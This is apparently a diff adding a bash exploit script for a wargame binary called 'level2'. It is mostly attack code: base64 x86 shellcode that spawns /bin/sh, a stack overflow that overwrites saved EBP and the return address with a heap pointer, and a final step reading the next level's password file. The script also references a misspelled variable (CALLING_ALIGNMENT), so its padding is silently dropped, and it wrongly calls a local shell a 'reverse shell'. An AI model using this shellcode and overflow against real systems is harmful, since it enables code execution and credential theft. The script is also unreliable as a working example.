@@ -1,0 +1,40 @@
+# Helper function, "put n s" print the string 's' n times
+put() { printf "$2%.0s" $(seq 1 "$1"); }
+
+# Helper function, "hex 41424344" gives "ABCD"
+hex() { echo "$1" | xxd -p -r; }
+
+# Helper function, "hex_little_endian 41424344" gives "DBCA"
+hex_little_endian() { hex $(printf "$1" | rev | fold -b2 | rev | tr -d '\n') ; }
+
+# Shellcode without '\n' or '\0' that executes 'execve("/bin//sh", NULL, NULL)'
+SHELLCODE_BASE64="McBQBAtoLy9zaGgvYmluieMxyTHSzYA="
+SHELLCODE="$(echo ${SHELLCODE_BASE64} | base64 --decode)"
+SHELLCODE_SIZE=$(printf "${SHELLCODE}" | wc -c)
+
+# We set the buffer to the shellcode and some filler
+BUFFER_SIZE=64
+BUFFER_FILLER_SIZE=$(echo "${BUFFER_SIZE} - ${SHELLCODE_SIZE}" | bc)
+BUFFER_FILLER="$(put ${BUFFER_FILLER_SIZE} A)"
+BUFFER="${SHELLCODE}${BUFFER_FILLER}"
+
+# We fill the value n
+N=$(put 4 "A")
+
+# We fill the call alignment of (16 - sizeof(%ebp) - sizeof(%eip))
+CALL_ALIGNMENT=$(put 8 "A")
+
+# We fill the %ebp saved value
+EBP_REPLACEMENT=$(put 4 "A")
+
+# We set the return address to the shellcode address on the heap
+P_BUFFER_STRDUP_ADDRESS="0804a008"
+SHELLCODE_ADDRESS="${P_BUFFER_STRDUP_ADDRESS}"
+EIP_REPLACEMENT="$(hex_little_endian ${SHELLCODE_ADDRESS})"
+
+# We print our exploit to the output and wait for the reverse shell to open with cat
+INPUT="${BUFFER}${N}${CALLING_ALIGNMENT}${EBP_REPLACEMENT}${EIP_REPLACEMENT}"
+(echo "${INPUT}" && cat) | ./level2
+
+# We use the reverse shell to retrieve the password
+$ cat /home/user/level3/.pass
